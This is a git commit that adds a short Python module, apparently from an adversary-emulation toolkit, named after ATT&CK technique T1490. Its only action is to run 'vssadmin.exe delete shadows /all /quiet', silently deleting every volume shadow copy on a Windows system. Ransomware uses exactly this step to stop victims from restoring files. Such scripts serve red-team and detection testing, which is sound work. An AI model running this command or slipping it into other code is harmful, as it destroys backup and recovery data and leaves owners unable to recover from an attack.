41104503ae1d01a7c68143c010bb9dca64c5501c
lehag7 <81866942+lehag7@users.noreply.github.com>
2021-04-11 08:56:07 -0500

    Create T1490-DeleteVolumeShadows.py

---
+++ Modules/T1490-DeleteVolumeShadows.py
@@ -0,0 +1,14 @@
+## Author: lehag
+## Code: T1490-DeleteVolumeShadows.py
+"""
+	Description:
+		It deletes all volume shadow copies on a system.
+"""
+import subprocess
+import sys
+
+if __name__ == "__main__":
+	print("[+] Deleting volume shadow copies on the system.");
+
+	## Deletes all volume shadow copies
+	result = subprocess.run(["vssadmin.exe", "delete", "shadows", "/all", "/quiet"]);
